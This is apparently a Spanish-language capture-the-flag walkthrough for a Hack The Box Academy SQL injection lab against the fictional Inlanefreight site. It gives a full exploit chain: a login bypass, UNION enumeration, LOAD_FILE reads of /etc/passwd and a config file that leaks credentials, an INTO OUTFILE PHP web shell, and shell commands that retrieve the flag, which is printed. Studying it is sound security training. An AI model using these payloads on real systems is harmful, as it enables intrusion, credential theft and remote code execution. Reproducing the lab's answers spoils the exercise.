
---
# Guía paso a paso de SQL Injection para Inlanefreight

**Contexto**:

La empresa Inlanefreight ha contratado para realizar una evaluación de aplicaciones web en uno de sus sitios web orientados al público. A raíz de una reciente violación de seguridad de uno de sus principales competidores, están especialmente preocupados por las vulnerabilidades de inyección SQL (SQLi) y el daño que el descubrimiento y la explotación exitosa de este ataque podrían causar a su imagen pública y resultados.

Se proporcionó únicamente la dirección IP de destino y ninguna otra información sobre el sitio web. La tarea consiste en realizar una evaluación completa de la aplicación web desde un enfoque de "caja gris", verificando la existencia de vulnerabilidades de inyección SQL. Debes encontrar dichas vulnerabilidades y enviar como bandera final el contenido de un archivo indicador localizado en el sistema de archivos, utilizando las técnicas vistas en este módulo.

**Target**: `94.237.57.108:31396`

**Laboratorio HTB:** https://academy.hackthebox.com/module/33/section/518

---

## Secuencia óptima de pasos

| Paso | Query (payload)                                                                                                                         | Explicación breve                                                |
| ---- | --------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| 1    | ```sql<br>' OR 1=1-- -<br>```                                                                                                           | Bypass de login para confirmar SQLi y acceso al panel.           |
| 2    | ```sql<br>' UNION SELECT 1,2,3,4,5-- -<br>```                                                                                           | Determinar número de columnas y confirmar inyección en “search”. |
| 3    | ```sql<br>' UNION SELECT 1, LOAD_FILE('/var/www/html/config.php'),3,4,5-- -<br>```                                                      | Leer `config.php` para obtener credenciales MySQL.               |
| 4    | ```sql<br>' UNION SELECT 1, "<?php system($_GET['cmd']); ?>",null,null,null INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -<br>``` | Escribir shell PHP en `/dashboard` para RCE (evita permisos).    |
| 5    | ```http<br>http://94.237.57.108:31396/dashboard/shell.php?cmd=find / -name *flag* 2>/dev/null<br>```                                    | Localizar archivo bandera en el sistema de ficheros.             |
| 6    | ```http<br>http://94.237.57.108:31396/dashboard/shell.php?cmd=cat /flag_cae1dadcd174.txt<br>```                                         | Leer el contenido de la bandera.                                 |

---

## Paso 1: Acceso al panel de login mediante SQLi básica

**Query**:

```sql
' OR 1=1-- -
```

**Resultado**:

```
Payroll Information
Adam	January	1337$ 	5%
James	March	1213$	8%
```

Se accede sin credenciales.

**Explicación**: Este payload fuerza la condición verdadera (`1=1`), eludiendo la autenticación y demostrando que la entrada no está correctamente filtrada.

---

## Paso 2: Inyección en el apartado "search"

**Query**:

```sql
' UNION SELECT 1,2,3,4,5-- -
```

**Resultado**:

```
Payroll Information
Adam	January	1337$	5%
James	March	1213$	8%
2	3	4	5
```

**Explicación**: El `UNION SELECT` permite combinar resultados de distintas consultas; esto confirma que la inyección funciona y revela el número de columnas (5 en este caso).

---

## Paso 3: Extracción de nombre de base de datos

**Query**:

```sql
' UNION SELECT 1,2,database(),4,5-- -
```

**Resultado**:

```
...
2	ilfreight	4	5
```

Base de datos actual: **ilfreight**.

**Explicación**: La función `database()` devuelve el nombre de la base activa, útil para enfocar futuras consultas.

---

## Paso 4: Verificar privilegios de `root`

**Query**:

```sql
' UNION SELECT 1, super_priv, 3, 4, 5
  FROM mysql.user
  WHERE user='root'-- -
```

**Resultado**:

```
...
Y	3	4	5
```

El usuario `root` posee `SUPER_PRIV` = **Y**.

**Explicación**: Saber si `root` tiene privilegio `SUPER` indica la posibilidad de operaciones avanzadas, como `INTO OUTFILE`.

---

## Paso 5: Enumerar privilegios completos de `root@localhost`

**Query**:

```sql
' UNION SELECT 1, grantee, privilege_type, 4, 5
  FROM information_schema.user_privileges
  WHERE grantee="'root'@'localhost'"-- -
```

**Resultado**:

```
'root'@'localhost'	SELECT	4	5
...
'root'@'localhost'	FILE	4	5
...
'root'@'localhost'	TRIGGER	4	5
...
```

El privilegio `FILE` indica que es posible leer archivos con `LOAD_FILE()`.

**Explicación**: Enumerar privilegios muestra la capacidad de lectura de archivos del sistema, esencial para extracción de archivos sensibles.

---

## Paso 6: Leer `/etc/passwd`

**Query**:

```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4, 5-- -
```

**Resultado**:

```
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
mysql:x:102:104:MySQL Server,,,:/nonexistent:/bin/false	3	4	5
```

**Explicación**: Probar `LOAD_FILE()` con `/etc/passwd` valida la capacidad de lectura remota de archivos del sistema.

---

## Paso 7: Intento de leer `search.php`

**Query**:

```sql
' UNION SELECT 1, LOAD_FILE('/var/www/html/search.php'), 3, 4, 5-- -
```

**Resultado**:

Columna vacía (sin salida).

**Explicación**: Ausencia de salida indica que el archivo existe pero no es legible por el usuario de la base de datos.

---

## Paso 8: Leer `config.php` para credenciales

**Query**:

```sql
' UNION SELECT 1, LOAD_FILE('/var/www/html/config.php'), 3, 4, 5-- -
```

**Resultado**:

```php
'127.0.0.1', 'DB_USERNAME' => 'root', 'DB_PASSWORD' => 'password', 'DB_DATABASE' => 'ilfreight'
```

Credenciales: **root:password** sobre base **ilfreight**.

**Explicación**: Extraer el archivo de configuración revela credenciales que permiten conexiones directas a la base de datos.

---

## Paso 9: Obtener todas las bases de datos

**Query**:

```sql
' UNION SELECT 1, schema_name, 3, 4, 5
  FROM information_schema.schemata-- -
```

**Resultado**:

```
ilfreight	3	4	5
backup	3	4	5
...
```

Además de `ilfreight`, existe la base **backup**.

**Explicación**: Listar esquemas ayuda a descubrir bases adicionales donde puedan existir datos sensibles o tablas de respaldo.

---

## Paso 10: Listar tablas en `backup`

**Query**:

```sql
' UNION SELECT 1, table_name, 3, 4, 5
  FROM information_schema.tables
  WHERE table_schema='backup'-- -
```

**Resultado**:

```
admin_bk	3	4	5
```

**Explicación**: Identificar tablas en la base `backup` permite localizar datos de interés como credenciales anteriores.

---

## Paso 11: Columnas de `admin_bk`

**Query**:

```sql
' UNION SELECT 1, column_name, 3, 4, 5
  FROM information_schema.columns
  WHERE table_name='admin_bk'-- -
```

**Resultado**:

```
username	3	4	5
password	3	4	5
```

**Explicación**: Conocer las columnas permite extraer datos específicos (usuarios y contraseñas) de la tabla.

---

## Paso 12: Extracción de usuarios (tabla `users` desconocida)

**Query**:

```sql
' UNION SELECT 1, username, password, 4, 5
  FROM users-- -
```

**Resultado**:

```
adam	1be9f5d3a82847b8acca40544f953515	4	5
```

Hash no crackeable en CrackStation.

**Explicación**: Intentar con la tabla `users` revela un usuario, pero el hash robusto impide descifrar la contraseña.

---

## Paso 13: Comprobar `secure_file_priv`

**Query**:

```sql
' UNION SELECT 1, variable_name, variable_value, 4, 5
  FROM information_schema.global_variables
  WHERE variable_name='secure_file_priv'-- -
```

**Resultado**:

Columnas vacías (sin valor). Indica ausencia de restricción clara en directorio de salida.

**Explicación**: `secure_file_priv` vacío sugiere que no hay directorio designado para operaciones `OUTFILE`, pero podría haber restricciones de permisos.

---

## Paso 14: Intento de escritura con `OUTFILE`

**Query**:

```sql
' UNION SELECT '', 'file written successfully!', '', '', ''
  INTO OUTFILE '/var/www/html/proof.txt'-- -
```

**Resultado**:

```
Can't create/write to file '/var/www/html/proof.txt' (Errcode: 13 "Permission denied")
```

Permiso denegado.

**Explicación**: El error 13 muestra falta de permisos de escritura en el directorio raíz del sitio.

---

## Paso 15: Credenciales de `admin_bk`

**Query**:

```sql
' UNION SELECT 1, username, password, 4, 5
  FROM backup.admin_bk-- -
```

**Resultado**:

```
admin	Inl@n3_fre1gh7_adm!n	4	5
```

Credenciales no válidas para el panel de login inicial.

**Explicación**: Probar credenciales de respaldo confirma que no coinciden con las del panel principal.

---

## Paso 16: Intento de RCE vía `OUTFILE`

**Query**:

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>", null, null, null, null
  INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Resultado**:

```
Can't create/write to file '/var/www/html/shell.php' (Errcode: 13 "Permission denied")
```

**Explicación**: Nuevamente, permisos restringidos impiden crear un shell PHP en el directorio principal.

---

## Paso 17: Exploración de columna FILES en information_schema

**Query**:

```sql
' UNION SELECT 1, column_name, 3, 4, 5
  FROM information_schema.columns
  WHERE table_schema='information_schema'
    AND table_name='FILES'-- -
```

**Resultado**:

Listado de columnas del esquema FILES.

**Explicación**: Analizar la estructura de la tabla FILES ayuda a identificar posibles métodos alternativos de extracción de archivos.

---

## Paso 18: Identificar logs en `mysql`

**Query**:

```sql
' UNION SELECT 1, table_name, 3, 4, 5
  FROM information_schema.tables
  WHERE table_schema='mysql'
    AND table_name IN ('general_log','slow_log')-- -
```

**Resultado**:

```
general_log	3	4	5
slow_log	3	4	5
```

**Explicación**: Localizar logs puede permitir lectura indirecta de datos mediante consultas a las tablas de registros.

---

## Paso 19: Concatenar credenciales de `admin_bk`

**Query**:

```sql
' UNION SELECT 1,
  group_concat(username,':',password SEPARATOR ';'),
  3, 4, 5
  FROM backup.admin_bk-- -
```

**Resultado**:

```
admin:Inl@n3_fre1gh7_adm!n	3	4	5
```

**Explicación**: `group_concat` compacta múltiples filas en una sola cadena, útil para extraer rápidamente credenciales en un solo resultado.

---

## Paso 20: Blind SQLi para extraer bandera

**Ejemplo de bit testing**:

```sql
' UNION SELECT 1,
  IF(ASCII(SUBSTRING((SELECT LOAD_FILE('/root/flag.txt')),1,1)) = 100,'V','F'),
  3,4,5-- -
```

**Resultado**:

```
F	3	4	5
```

**Longitud**:

```sql
' UNION SELECT 1,
  IF(LENGTH(LOAD_FILE('/root/flag.txt')) > 0,
     LENGTH(LOAD_FILE('/root/flag.txt')),0),
  3,4,5-- -
```

**Resultado**:

```
0	3	4	5
```

Indicador de que acceso directo no funciona inicialmente.

**Explicación**: Las técnicas de Blind SQLi permiten extraer datos bit a bit cuando la salida directa está restringida.

---

## Paso 21: Descubrimiento de directorio administrativo oculto

**URL**:

```
http://94.237.57.108:31396/dashboard/dashboard.php/admin//admin.php
```

Acceso a panel administrativo sin CSS.

**Explicación**: Buscar rutas alternativas revela páginas administrativas ocultas con diferentes permisos.

---

## Paso 22: RCE exitoso en `/dashboard`

**Query**:

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>",null,null,null,null
  INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -
```

**Shell**:

```
http://94.237.57.108:31396/dashboard/shell.php?cmd=id
```

**Resultado**:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Explicación**: Escribir el shell en el subdirectorio `/dashboard` elude restricciones de permisos y habilita RCE bajo `www-data`.

---

## Paso 23: Evitar sobrescritura de shell

**Query**:

```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>",null,null,null,null
  INTO OUTFILE './shell.php'-- -
```

**Resultado**:

```
File './shell.php' already exists
```

**Explicación**: Intento de regenerar el shell falla para prevenir sobrescritura, confirmando ubicación y nombre del archivo.

---

## Paso 24: Búsqueda de archivo bandera

**Comando**:

```
http://94.237.57.108:31396/dashboard/shell.php?cmd=find / -name *flag* 2>/dev/null
```

**Resultado**:

```
/flag_cae1dadcd174.txt
... (otros paths de flags del sistema)
```

**Explicación**: El comando `find` rastrea todo el sistema de archivos para localizar posibles archivos bandera.

---

## Paso 25: Lectura de la bandera final

**Comando**:

```
http://94.237.57.108:31396/dashboard/shell.php?cmd=cat /flag_cae1dadcd174.txt
```

**Resultado**:

```
528d6d9cedc2c7aab146ef226e918396
```

**Flag**: `528d6d9cedc2c7aab146ef226e918396`

**Explicación**: Leer directamente el archivo de la bandera confirma la explotación completa y el objetivo alcanzado.

---

## Reflexión y Metodología del Proceso

A continuación se explica el razonamiento y puntos clave que guían la metodología de explotación SQLi hasta la obtención de la bandera:

1. **Ingreso Inicial y Confirmación de SQLi**  
    Se inicia validando que el login es vulnerable a SQLi básica (`' OR 1=1-- -`). Este paso confirma que la aplicación no filtra ni parametriza correctamente las consultas, permitiendo manipular la lógica de autenticación.
    
2. **Enumerar y Confirmar Inyección**  
    El uso de `UNION SELECT` en la funcionalidad de búsqueda sirve para determinar la estructura de columnas y confirmar la inyección en puntos distintos de la aplicación.
    
3. **Descubrimiento de la Base y Privilegios**
    
    - `database()` revela el nombre de la BD activa.
        
    - Consultas a `mysql.user` e `information_schema.user_privileges` muestran privilegios críticos (`SUPER`, `FILE`), que habilitan lectura y escritura de archivos.
        
4. **Lectura de Archivos Sensibles**  
    Utilizando `LOAD_FILE()`, se extraen `/etc/passwd` y `config.php`. El primero verifica capacidad de lectura, el segundo proporciona credenciales para exploración más profunda.
    
5. **Exploración de Esquemas y Tablas Secundarias**  
    Listar esquemas (`information_schema.schemata`) y tablas en `backup` descubre tablas con credenciales de respaldo.
    
6. **Intentos de Escritura y RCE**
    
    - `INTO OUTFILE` falla inicialmente, pero al identificar `/dashboard`, se logra escribir un shell PHP.
        
    - La ejecución remota de comandos bajo `www-data` permite control del sistema.
        
7. **Extracción Final de la Bandera**  
    Con el shell activo, se localiza y lee el archivo bandera con `find` y `cat`.
    

**Conclusión**: Este proceso ordenado, desde la validación hasta la explotación remota y lectura de la bandera, demuestra una metodología sistemática de SQLi con RCE, maximizando efectividad y minimizando pasos innecesarios.

---
